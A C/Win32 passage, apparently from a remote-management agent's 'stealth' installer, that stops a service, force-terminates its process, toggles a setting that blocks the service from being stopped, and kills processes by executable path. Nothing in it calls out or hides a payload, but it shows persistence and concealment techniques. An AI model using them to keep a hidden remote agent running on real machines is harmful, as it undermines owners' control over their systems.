        }
        Sleep(500);
        waited += 500;
    }

    if (!stopped)
    {
        Stealth_LogInstallEvent(L"[WARN] Service stop timed out for %ls (state=%lu pid=%lu)", serviceName, ssp.dwCurrentState, ssp.dwProcessId);
    }

    if (!stopped && forceTerminate && ssp.dwProcessId != 0)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, ssp.dwProcessId);
        if (hProcess != NULL)
        {
            if (!canStop)
            {
                Stealth_LogInstallEvent(L"[WARN] Stop control denied for %ls; terminating PID %lu", serviceName, ssp.dwProcessId);
            }
            TerminateProcess(hProcess, 0);
            WaitForSingleObject(hProcess, 5000);
            CloseHandle(hProcess);
        }
        QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed);
        stopped = (ssp.dwCurrentState == SERVICE_STOPPED);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (allowStopSet)
    {
        Stealth_SetServiceAllowStop(serviceName, FALSE);
    }
    return stopped;
}

static void Stealth_TerminateProcessesByPath(const wchar_t* exePath)
{
    if (exePath == NULL || exePath[0] == L'\0') { return; }
    if (GetFileAttributesW(exePath) == INVALID_FILE_ATTRIBUTES) { return; }

    DWORD currentPid = GetCurrentProcessId();
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) { return; }

    PROCESSENTRY32W entry;
    ZeroMemory(&entry, sizeof(entry));
    entry.dwSize = sizeof(entry);

    if (Process32FirstW(snapshot, &entry))
    {
        do
        {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE | SYNCHRONIZE,
                                          FALSE,
                                          entry.th32ProcessID);
            if (hProcess == NULL) { continue; }

            wchar_t imagePath[MAX_PATH * 2] = {0};
            DWORD imageLen = _countof(imagePath);
            if (QueryFullProcessImageNameW(hProcess, 0, imagePath, &imageLen))
            {
                MeshInstaller_NormalizePathSeparators(imagePath);
                if (_wcsicmp(imagePath, exePath) == 0 && entry.th32ProcessID != currentPid)
                {
                    Stealth_LogInstallEvent(L"Terminating process %ls (pid=%lu)", exePath, entry.th32ProcessID);
                    TerminateProcess(hProcess, 0);
                    WaitForSingleObject(hProcess, 5000);
                }
            }

            CloseHandle(hProcess);
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
}
